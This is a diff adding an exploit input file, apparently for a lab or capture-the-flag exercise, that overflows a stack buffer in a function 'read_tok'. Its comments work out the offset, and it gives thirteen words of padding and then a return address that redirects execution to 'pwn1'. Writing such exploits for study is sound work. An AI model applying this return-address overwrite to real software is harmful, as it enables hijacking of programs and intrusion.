@@ -1,0 +1,14 @@
+FFFFFFFFFFFFFFFF // there are 13 words
+FFFFFFFFFFFFFFFF // of garbage input, as 
+FFFFFFFFFFFFFFFF // read_tok starts by subtracting 160 from the stack pointer
+FFFFFFFFFFFFFFFF // then, later, when read_tok starts grabing each character from fgetc,
+FFFFFFFFFFFFFFFF // it stores them into x1 + x0, where x0 is the character offset, and x1
+FFFFFFFFFFFFFFFF // is sp + 64.
+FFFFFFFFFFFFFFFF // 160-64 is 96, but since the lr from the previous function is stored 1 word
+FFFFFFFFFFFFFFFF // above read_tok's stack frame, to rewrite the lr of the previous function,
+FFFFFFFFFFFFFFFF // since 96+8=104, 104/8=13, 13 words of garbage are needed before placing the
+FFFFFFFFFFFFFFFF // return address into the correct place
+FFFFFFFFFFFFFFFF // ** continue writing garbage
+FFFFFFFFFFFFFFFF // ** continue writing garbage
+FFFFFFFFFFFFFFFF // ** continue writing garbage
+d406400000000000 // this place the return address leading to pwn1 at the lr of the func that calls read_tok
